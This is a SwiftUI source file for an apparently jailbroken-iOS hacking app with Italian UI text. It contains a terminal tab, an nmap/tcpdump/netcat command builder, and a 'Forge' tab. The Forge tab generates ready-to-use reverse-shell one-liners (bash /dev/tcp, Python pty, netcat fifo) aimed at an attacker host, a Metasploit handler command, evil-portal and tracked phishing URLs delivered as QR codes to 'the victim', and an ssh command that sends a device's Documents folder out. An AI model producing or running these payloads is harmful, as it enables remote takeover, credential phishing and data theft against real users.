import SwiftUI
import CoreImage

@MainActor
final class TerminalModel: ObservableObject {
    @Published var lines: [LogEntry] = []
    @Published var running = false

    func append(_ text: String, _ level: LogEntry.Level = .info) {
        lines.append(LogEntry(level: level, text: text))
    }

    func run(_ raw: String) {
        guard !running else { return }
        let cmd = raw.trimmingCharacters(in: .whitespaces)
        guard !cmd.isEmpty else { return }
        let parts = cmd.split(separator: " ", omittingEmptySubsequences: true).map(String.init)
        guard let head = parts.first else { return }

        if ShellRunner.shared.resolve(head) == nil {
            running = true
            append("tool '\(head)' non trovato — auto-install da repo…", .warn)
            let toolName = head
            ToolRegistry.install(toolName) { l in
                DispatchQueue.main.async { self.append(l) }
            } done: { ok in
                DispatchQueue.main.async {
                    self.running = false
                    if ok {
                        self.append("'\(toolName)' installato — rieseguo", .good)
                        self.run(cmd)
                    } else {
                        self.append("auto-install fallita per '\(toolName)' — Sileo aperto, installa lì e riprova", .bad)
                        Haptics.fail()
                    }
                }
            }
            return
        }

        running = true
        Haptics.tap()
        append("$ \(cmd)", .exec)
        let args = Array(parts.dropFirst())
        ShellRunner.shared.stream(head, args: args, line: { l in
            DispatchQueue.main.async { self.append(l) }
        }, onExit: { code in
            DispatchQueue.main.async {
                self.append("exit \(code)", .warn)
                self.running = false
            }
        })
    }
}

struct ToolsTab: View {
    @StateObject private var tm = TerminalModel()
    @State private var mode = 0

    var body: some View {
        NavigationStack {
            VStack(spacing: 0) {
                Picker("tool", selection: $mode) {
                    Text("Terminal").tag(0)
                    Text("Builder").tag(1)
                    Text("Forge").tag(2)
                }
                .pickerStyle(.segmented)
                .padding(10)
                switch mode {
                case 0: TerminalView().environmentObject(tm)
                case 1: BuilderView().environmentObject(tm)
                default: ForgeView()
                }
            }
            .background(Color.bg.ignoresSafeArea())
            .navigationTitle("Tools")
            .navigationBarTitleDisplayMode(.inline)
        }
        .preferredColorScheme(.dark)
    }
}

// MARK: - Terminal

struct TerminalView: View {
    @EnvironmentObject var tm: TerminalModel
    @State private var input = ""
    @FocusState private var focused: Bool

    private let quick: [(String, String)] = [
        ("whoami", "whoami"),
        ("uname", "uname -a"),
        ("jb", "ls /var/jb/usr/bin"),
        ("apps bin", "ls /var/jb/Applications"),
        ("procs", "ps aux"),
        ("ports", "netstat -an"),
        ("disk", "df -h"),
        ("curl me", "curl -s ifconfig.me"),
    ]

    var body: some View {
        VStack(spacing: 0) {
            ScrollView(.horizontal, showsIndicators: false) {
                HStack(spacing: 8) {
                    ForEach(ShellRunner.shared.availableTools, id: \.self) { t in
                        Chip(text: t, active: false) { input = "\(t) " ; focused = true }
                    }
                    ForEach(ToolRegistry.specs, id: \.name) { s in
                        let installed = ShellRunner.shared.resolve(s.name) != nil
                        Chip(text: installed ? s.name : "+ \(s.name)", active: false) {
                            if installed {
                                input = "\(s.name) "
                                focused = true
                            } else {
                                tm.runSmartText("install \(s.name)")
                            }
                        }
                    }
                    ForEach(quick, id: \.0) { q in
                        Chip(text: q.0, active: false) { tm.run(q.1) }
                    }
                }
                .padding(.horizontal, 10)
            }
            .padding(.vertical, 8)

            ScrollViewReader { proxy in
                ScrollView {
                    LazyVStack(alignment: .leading, spacing: 4) {
                        ForEach(tm.lines) { l in
                            Text(l.text)
                                .font(.system(size: 11, design: .monospaced))
                                .foregroundColor(l.level == .exec ? .redHat : (l.level == .good ? .ok : (l.level == .bad ? .bad : .white.opacity(0.85))))
                                .textSelection(.enabled)
                                .id(l.id)
                        }
                    }
                    .padding(12)
                }
                .background(Color(hex: 0x070709))
                .onChange(of: tm.lines.count) { _ in
                    withAnimation { proxy.scrollTo(tm.lines.last?.id, anchor: .bottom) }
                }
            }

            HStack(spacing: 10) {
                Text("rhs")
                    .font(.system(size: 12, weight: .heavy, design: .monospaced))
                    .foregroundColor(.redHat)
                TextField(tm.running ? "in esecuzione…" : "comando…", text: $input)
                    .textFieldStyle(.plain)
                    .font(.system(size: 13, design: .monospaced))
                    .focused($focused)
                    .onSubmit { tm.runSmartText(input); input = "" }
                Button {
                    tm.runSmartText(input)
                    input = ""
                } label: {
                    Image(systemName: "play.fill")
                        .font(.system(size: 13, weight: .bold))
                        .foregroundColor(tm.running ? .dim : .redHat)
                }
                .disabled(tm.running)
                Button {
                    tm.lines.removeAll()
                } label: {
                    Image(systemName: "trash")
                        .font(.system(size: 13)).foregroundColor(.dim)
                }
            }
            .padding(12)
            .background(Color.surface)
        }
        .onAppear { focused = true }
    }
}

extension TerminalModel {
    func runSmartText(_ raw: String) {
        let cmd = raw.trimmingCharacters(in: .whitespaces)
        guard !cmd.isEmpty, !running else { return }
        let parts = cmd.split(separator: " ", omittingEmptySubsequences: true).map(String.init)
        guard let head = parts.first, head != "install" else {
            if head == "install", parts.count > 1 {
                installTool(parts[1])
            }
            return
        }
        if ShellRunner.shared.resolve(head) == nil {
            installTool(head, then: cmd)
            return
        }
        run(cmd)
    }

    func installTool(_ tool: String, then cmd: String? = nil) {
        guard !running else { return }
        running = true
        append("auto-install '\(tool)'…", .warn)
        ToolRegistry.install(tool) { l in
            DispatchQueue.main.async { self.append(l) }
        } done: { ok in
            DispatchQueue.main.async {
                self.running = false
                if ok {
                    self.append("'\(tool)' pronto ✓", .good)
                    if let cmd { self.run(cmd) }
                } else {
                    self.append("install fallita — Sileo aperto sul pacchetto", .bad)
                    Haptics.fail()
                }
            }
        }
    }
}

// MARK: - Builder (GUI command)

struct BuilderView: View {
    @EnvironmentObject var tm: TerminalModel
    @State private var selectedTool = "nmap"
    @State private var values: [String: String] = [:]
    @FocusState private var focused: Bool

    private struct Template {
        let tool: String
        let fields: [(label: String, key: String, def: String)]
        let build: ([String: String]) -> String
    }

    private let templates: [Template] = [
        Template(tool: "nmap", fields: [("target", "target", "192.168.1.0/24"),
                                        ("ports", "ports", "1-1024"),
                                        ("flags", "flags", "-sV -T4")],
                 build: { v in "nmap \(v["flags"] ?? "") -p \(v["ports"] ?? "") \(v["target"] ?? "")" }),
        Template(tool: "tcpdump", fields: [("iface", "iface", "any"),
                                           ("filter", "filter", "port 80")],
                 build: { v in "tcpdump -i \(v["iface"] ?? "any") -n \(v["filter"] ?? "")" }),
        Template(tool: "curl", fields: [("url", "url", "http://target/"),
                                        ("method", "method", "GET")],
                 build: { v in "curl -s -X \(v["method"] ?? "GET") \(v["url"] ?? "")" }),
        Template(tool: "ping", fields: [("host", "host", "192.168.1.1"),
                                        ("count", "count", "3")],
                 build: { v in "ping -c \(v["count"] ?? "3") \(v["host"] ?? "")" }),
        Template(tool: "netcat", fields: [("host", "host", "10.0.0.2"),
                                          ("port", "port", "80")],
                 build: { v in "nc \(v["host"] ?? "") \(v["port"] ?? "")" }),
        Template(tool: "python3", fields: [("script", "script", "scapy"),
                                           ("args", "args", "")],
                 build: { v in v["script"] == "scapy" ? "python3 -c \"from scapy.all import *\" --help" : "python3 \(v["script"] ?? "") \(v["args"] ?? "")" }),
        Template(tool: "raw", fields: [("cmd", "cmd", "echo hello")],
                 build: { v in v["cmd"] ?? "" }),
    ]

    private var template: Template {
        templates.first { $0.tool == selectedTool } ?? templates.last!
    }

    private var command: String {
        var v = values
        for f in template.fields where (v[f.key] ?? "").isEmpty {
            v[f.key] = f.def
        }
        return template.build(v)
    }

    var body: some View {
        ScrollView {
            VStack(alignment: .leading, spacing: 14) {
                ScrollView(.horizontal, showsIndicators: false) {
                    HStack(spacing: 8) {
                        ForEach(templates, id: \.tool) { t in
                            let installed = t.tool == "raw" || t.tool == "ping" || ShellRunner.shared.resolve(t.tool) != nil
                            Chip(text: t.tool, active: selectedTool == t.tool) {
                                selectedTool = t.tool
                                values = [:]
                                Haptics.tap()
                            }
                            .opacity(installed ? 1 : 0.45)
                        }
                    }
                }

                ForEach(Array(template.fields.enumerated()), id: \.offset) { _, f in
                    VStack(alignment: .leading, spacing: 4) {
                        Text(f.label.uppercased()).font(.system(size: 10, weight: .bold)).foregroundColor(.dim)
                        TextField(f.def, text: Binding(
                            get: { values[f.key] ?? "" },
                            set: { values[f.key] = $0 }))
                            .textFieldStyle(.plain)
                            .font(.system(size: 13, design: .monospaced))
                            .padding(10)
                            .background(RoundedRectangle(cornerRadius: 10).fill(Color(hex: 0x070709)))
                            .overlay(RoundedRectangle(cornerRadius: 10).strokeBorder(Color.white.opacity(0.1), lineWidth: 1))
                            .focused($focused)
                    }
                }

                Text("COMANDO GENERATO").font(.system(size: 10, weight: .bold)).foregroundColor(.dim)
                Text(command)
                    .font(.system(size: 12, design: .monospaced))
                    .padding(12).frame(maxWidth: .infinity, alignment: .leading)
                    .background(RoundedRectangle(cornerRadius: 12).fill(Color(hex: 0x070709)))
                    .overlay(RoundedRectangle(cornerRadius: 12).strokeBorder(Color.white.opacity(0.08), lineWidth: 1))
                    .foregroundColor(.ok)
                    .textSelection(.enabled)

                HStack(spacing: 10) {
                    Button {
                        tm.runSmartText(command)
                        Haptics.heavy()
                    } label: {
                        Label("RUN", systemImage: "play.fill")
                            .font(.system(size: 13, weight: .bold, design: .rounded))
                            .frame(maxWidth: .infinity).padding(.vertical, 12)
                    }
                    .background(RoundedRectangle(cornerRadius: 12).fill(Color.redHat))
                    .foregroundColor(.white)
                    .buttonStyle(ScaleButton())

                    Button {
                        UIPasteboard.general.string = command
                        Haptics.win()
                    } label: {
                        Label("COPY", systemImage: "doc.on.doc")
                            .font(.system(size: 13, weight: .bold, design: .rounded))
                            .frame(maxWidth: .infinity).padding(.vertical, 12)
                    }
                    .background(RoundedRectangle(cornerRadius: 12).fill(Color.surfaceHi))
                    .foregroundColor(.white)
                    .buttonStyle(ScaleButton())
                }

                Text("Il comando gira nel tab Terminal (output condiviso). I tool in opacità ridotta verranno auto-installati al primo RUN.")
                    .font(.caption).foregroundColor(.dim)
            }
            .padding(16)
        }
        .background(Color.bg.ignoresSafeArea())
    }
}

// MARK: - Forge

struct ForgeView: View {
    enum Kind: String, CaseIterable, Identifiable {
        case revBash = "Bash"
        case revPy = "Python"
        case revNC = "Netcat"
        case msf = "MSF Handler"
        case portal = "Evil Portal"
        case phish = "Phish URL"
        case sshExfil = "SSH Exfil"
        case webhook = "Webhook Catch"
        var id: String { rawValue }
    }

    @State private var kind: Kind = .revBash
    @State private var host = ""
    @State private var port = "4444"
    @State private var path = "/login"
    @State private var copied = false

    private var payload: String {
        let h = host.isEmpty ? "ATTACKER_IP" : host
        let p = Int(port) ?? 4444
        switch kind {
        case .revBash:
            return "bash -i >& /dev/tcp/\(h)/\(p) 0>&1"
        case .revPy:
            return "python3 -c \"import socket,os,pty;s=socket.socket();s.connect(('\(h)',\(p)));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')\""
        case .revNC:
            return "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc \(h) \(p) > /tmp/f"
        case .msf:
            return "msfconsole -q -x \"use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST \(h); set LPORT \(p); run\""
        case .portal:
            return "http://\(h):\(p)\(path.isEmpty ? "/login" : path)"
        case .phish:
            let track = UUID().uuidString.prefix(8)
            return "https://\(h)\(path.isEmpty ? "/session" : path)?src=qr&sid=\(track)"
        case .sshExfil:
            return "tar czf - /var/mobile/Documents 2>/dev/null | ssh \(h) 'cat > /tmp/exfil-\(Int(Date().timeIntervalSince1970)).tar.gz'"
        case .webhook:
            return "python3 -m http.server \(p) --bind 0.0.0.0"
        }
    }

    private var hint: String {
        switch kind {
        case .revBash, .revPy, .revNC:
            return "Listener: MSF Handler o nc -lvnp \(port) su \(host.isEmpty ? "host" : host)"
        case .msf: return "Esegui su host attacker. Payload adattato all'arch del target."
        case .portal: return "Servi la pagina con hostapd + dnsmasq; QR mostrato alla vittima."
        case .phish: return "Il sid traccia le aperture. Manda come QR o link."
        case .sshExfil: return "Richiede chiave ssh sul target."
        case .webhook: return "Server catch-all: exfil via GET query string nel log."
        }
    }

    var body: some View {
        ScrollView {
            VStack(alignment: .leading, spacing: 14) {
                ScrollView(.horizontal, showsIndicators: false) {
                    HStack(spacing: 8) {
                        ForEach(Kind.allCases) { k in
                            Chip(text: k.rawValue, active: kind == k) { kind = k }
                        }
                    }
                }
                HStack(spacing: 10) {
                    forgeField("attacker host/IP", $host)
                    forgeField("port", $port, w: 80)
                }
                if kind == .portal || kind == .phish {
                    forgeField("path", $path)
                }

                Text("PAYLOAD").font(.system(size: 10, weight: .bold)).foregroundColor(.dim)
                Text(payload)
                    .font(.system(size: 12, design: .monospaced))
                    .padding(12).frame(maxWidth: .infinity, alignment: .leading)
                    .background(RoundedRectangle(cornerRadius: 12).fill(Color(hex: 0x070709)))
                    .overlay(RoundedRectangle(cornerRadius: 12).strokeBorder(Color.white.opacity(0.08), lineWidth: 1))
                    .foregroundColor(.ok)
                    .textSelection(.enabled)

                HStack(spacing: 10) {
                    Button {
                        UIPasteboard.general.string = payload
                        Haptics.win()
                        copied = true
                        DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) { copied = false }
                    } label: {
                        Label(copied ? "COPIED" : "COPY", systemImage: copied ? "checkmark" : "doc.on.doc")
                            .font(.system(size: 13, weight: .bold, design: .rounded))
                            .frame(maxWidth: .infinity).padding(.vertical, 12)
                    }
                    .background(RoundedRectangle(cornerRadius: 12).fill(Color.redHat))
                    .foregroundColor(.white)
                    .buttonStyle(ScaleButton())

                    Button {
                        UIPasteboard.general.string = payload
                        if let img = QRCodec.image(payload), let png = img.pngData() {
                            let urls = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
                                .appendingPathComponent("forge_payload.png")
                            try? png.write(to: urls)
                            Haptics.tap()
                        }
                    } label: {
                        Label("QR→FILE", systemImage: "qrcode")
                            .font(.system(size: 13, weight: .bold, design: .rounded))
                            .frame(maxWidth: .infinity).padding(.vertical, 12)
                    }
                    .background(RoundedRectangle(cornerRadius: 12).fill(Color.surfaceHi))
                    .foregroundColor(.white)
                    .buttonStyle(ScaleButton())
                }

                if payload.count < 400, let img = QRCodec.image(payload) {
                    Text("QR PAYLOAD").font(.system(size: 10, weight: .bold)).foregroundColor(.dim)
                    Image(uiImage: img)
                        .interpolation(.none)
                        .resizable()
                        .scaledToFit()
                        .frame(width: 220, height: 220)
                        .padding(14).background(Color.white)
                        .cornerRadius(14)
                        .frame(maxWidth: .infinity)
                }

                Text(hint).font(.caption).foregroundColor(.dim)
            }
            .padding(16)
        }
        .background(Color.bg.ignoresSafeArea())
    }

    private func forgeField(_ ph: String, _ bind: Binding<String>, w: CGFloat? = nil) -> some View {
        TextField(ph, text: bind)
            .textFieldStyle(.plain).font(.system(size: 13, design: .monospaced))
            .padding(10)
            .background(RoundedRectangle(cornerRadius: 10).fill(Color(hex: 0x070709)))
            .overlay(RoundedRectangle(cornerRadius: 10).strokeBorder(Color.white.opacity(0.1), lineWidth: 1))
            .frame(width: w)
    }
}

enum QRCodec {
    static func image(_ s: String) -> UIImage? {
        let data = Data(s.utf8)
        guard let filter = CIFilter(name: "CIQRCodeGenerator") else { return nil }
        filter.setValue(data, forKey: "inputMessage")
        filter.setValue("H", forKey: "inputCorrectionLevel")
        guard let out = filter.outputImage else { return nil }
        let scaled = out.transformed(by: CGAffineTransform(scaleX: 12, y: 12))
        guard let cg = CIContext().createCGImage(scaled, from: scaled.extent) else { return nil }
        return UIImage(cgImage: cg)
    }
}
